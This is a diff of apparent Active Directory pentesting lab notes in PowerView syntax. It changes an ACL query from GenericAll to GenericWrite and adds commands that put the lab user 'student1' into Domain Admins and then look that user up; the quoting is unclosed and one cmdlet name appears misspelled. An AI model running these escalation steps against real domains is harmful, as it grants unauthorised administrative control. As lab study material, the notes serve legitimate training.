@@ -12,10 +12,15 @@ Get-DomainGroup -Name 'Domain Admins'
 
 
 Get-ObjectAcl -SamAccountName * -ResolveGUIDs | ? {
-    ($_.ActiveDirectoryRights -match 'GenericAll') -or ($_.SecurityIdentifier -match '5-1-5-XXXX)
+    ($_.ActiveDirectoryRights -match 'GenericWrite') -or ($_.SecurityIdentifier -match '5-1-5-XXXX)
 }
 
 Get-ObjectAcl -SamAccountName 'Domain Admins' -ResolveGUIDs | ? {
     ($_.ActiveDirectoryRights -match 'GenericAll') -or ($_.SecurityIdentifier -match '5-1-5-XXXX)
 }
 
+# add member to domain admin group
+Add-DomainGroupMember -Identity 'Domain Admins' -Members 'student1' -Domain 'pentesting'
+
+# see memberof
+GetDomainUser -Name student1
